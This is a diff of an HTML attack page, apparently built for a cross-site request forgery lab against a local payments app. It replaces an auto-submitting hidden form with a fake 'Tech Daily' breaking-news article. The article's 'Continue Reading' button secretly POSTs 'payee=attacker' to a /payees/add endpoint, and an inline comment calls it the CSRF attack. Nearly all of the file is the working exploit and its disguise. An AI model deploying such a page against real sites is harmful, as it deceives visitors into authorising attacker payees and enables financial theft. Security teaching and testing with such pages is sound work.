@@ -1,20 +1,182 @@
 <!doctype html>
-<html>
+<html lang="en">
   <head>
     <meta charset="utf-8" />
-    <title>Interesting Article</title>
+    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+    <title>Breaking News - Tech Daily</title>
+    <style>
+      * {
+        margin: 0;
+        padding: 0;
+        box-sizing: border-box;
+      }
+      
+      body {
+        font-family: Georgia, 'Times New Roman', serif;
+        min-height: 100vh;
+        background: #f5f5f5;
+        padding: 20px;
+      }
+      
+      .navbar {
+        background: #1f2937;
+        color: white;
+        padding: 15px 20px;
+        margin-bottom: 30px;
+        border-radius: 8px;
+        text-align: center;
+      }
+      
+      .navbar h1 {
+        font-size: 24px;
+        font-weight: 700;
+        letter-spacing: 1px;
+      }
+      
+      .container {
+        max-width: 800px;
+        margin: 0 auto;
+      }
+      
+      .article-card {
+        background: white;
+        border-radius: 12px;
+        padding: 40px;
+        box-shadow: 0 4px 16px rgba(0, 0, 0, 0.1);
+      }
+      
+      .breaking-badge {
+        display: inline-block;
+        background: #ef4444;
+        color: white;
+        padding: 6px 14px;
+        border-radius: 20px;
+        font-size: 12px;
+        font-weight: 700;
+        letter-spacing: 1px;
+        margin-bottom: 15px;
+        font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif;
+      }
+      
+      h1 {
+        font-size: 36px;
+        color: #1f2937;
+        margin-bottom: 15px;
+        line-height: 1.2;
+      }
+      
+      .meta {
+        color: #6b7280;
+        font-size: 14px;
+        margin-bottom: 25px;
+        padding-bottom: 20px;
+        border-bottom: 1px solid #e5e7eb;
+        font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif;
+      }
+      
+      .article-image {
+        width: 100%;
+        height: 300px;
+        background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
+        border-radius: 8px;
+        margin-bottom: 25px;
+        display: flex;
+        align-items: center;
+        justify-content: center;
+        font-size: 80px;
+      }
+      
+      .article-content {
+        font-size: 18px;
+        line-height: 1.8;
+        color: #374151;
+        margin-bottom: 30px;
+      }
+      
+      .article-content p {
+        margin-bottom: 15px;
+      }
+      
+      .cta-box {
+        background: linear-gradient(135deg, #fef3c7 0%, #fde68a 100%);
+        border: 2px solid #f59e0b;
+        border-radius: 10px;
+        padding: 25px;
+        text-align: center;
+        margin-bottom: 20px;
+      }
+      
+      .cta-text {
+        color: #92400e;
+        font-size: 16px;
+        font-weight: 600;
+        margin-bottom: 15px;
+        font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif;
+      }
+      
+      button {
+        padding: 14px 32px;
+        background: #1f2937;
+        color: white;
+        border: none;
+        border-radius: 8px;
+        font-size: 16px;
+        font-weight: 600;
+        cursor: pointer;
+        transition: background 0.2s, transform 0.2s;
+        font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif;
+      }
+      
+      button:hover {
+        background: #111827;
+        transform: translateY(-2px);
+      }
+      
+      button:active {
+        transform: translateY(0);
+      }
+    </style>
   </head>
   <body>
-    <h1>Breaking News</h1>
-    <p>Loading...</p>
+    <div class="navbar">
+      <h1>📰 TECH DAILY NEWS</h1>
+    </div>
 
-    <form action="http://127.0.0.1:8000/payees/add" method="POST">
-      <input type="hidden" name="payee" value="attacker" />
-      <!-- No CSRF token -->
-    </form>
+    <div class="container">
+      <div class="article-card">
+        <span class="breaking-badge">🔴 BREAKING NEWS</span>
+        <h1>Major Technology Breakthrough Announced</h1>
+        <div class="meta">
+          By Tech Daily Staff • Published 2 hours ago • 5 min read
+        </div>
 
-    <script>
-      document.forms[0].submit();
-    </script>
+        <div class="article-image">💻</div>
+
+        <div class="article-content">
+          <p>
+            In a groundbreaking announcement today, industry leaders revealed a significant 
+            technological advancement that could reshape the digital landscape. The development 
+            comes after months of anticipation from experts worldwide.
+          </p>
+          <p>
+            Sources close to the matter suggest this innovation will have far-reaching 
+            implications across multiple sectors, potentially affecting millions of users 
+            globally. Industry analysts are calling it one of the most important developments 
+            of the year.
+          </p>
+        </div>
+
+        <div class="cta-box">
+          <p class="cta-text">
+            🔓 Unlock Full Article Access • Read the complete story and expert analysis
+          </p>
+          <form action="/payees/add" method="POST">
+            <input type="hidden" name="payee" value="attacker" />
+            <!-- No CSRF token (this is the CSRF attack) -->
+            <button type="submit">Continue Reading →</button>
+          </form>
+        </div>
+      </div>
+    </div>
   </body>
 </html>
